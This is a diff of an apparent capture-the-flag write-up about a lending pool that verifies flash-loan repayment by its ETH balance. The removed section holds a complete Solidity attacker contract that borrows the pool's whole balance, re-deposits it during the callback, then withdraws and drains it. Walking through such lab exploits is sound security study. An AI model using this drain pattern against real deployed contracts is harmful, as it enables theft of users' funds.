@@ -30,38 +30,6 @@ the pool checks if a flash loan got repaid by looking at its ETH balance before 
 - withdraw has no timing rules. once flashLoan returns, you can pull the ETH straight out.
 - everything runs in one transaction, so no one can interrupt.
 
-## poc
-
-```solidity
-function test_sideEntrance() public checkSolvedByPlayer {
-    SideEntranceAttacker attacker = new SideEntranceAttacker(pool, recovery);
-    attacker.attack();
-}
-
-contract SideEntranceAttacker {
-    SideEntranceLenderPool pool;
-    address recovery;
-
-    constructor(SideEntranceLenderPool _pool, address _recovery) {
-        pool = _pool;
-        recovery = _recovery;
-    }
-
-    function attack() external {
-        pool.flashLoan(address(pool).balance);
-        pool.withdraw();
-        (bool ok, ) = recovery.call{value: address(this).balance}("");
-        require(ok);
-    }
-
-    function execute() external payable {
-        pool.deposit{value: msg.value}();
-    }
-
-    receive() external payable {}
-}
-```
-
 run: `forge test --mp test/side-entrance/SideEntrance.t.sol -vvv`
 
 ## summary
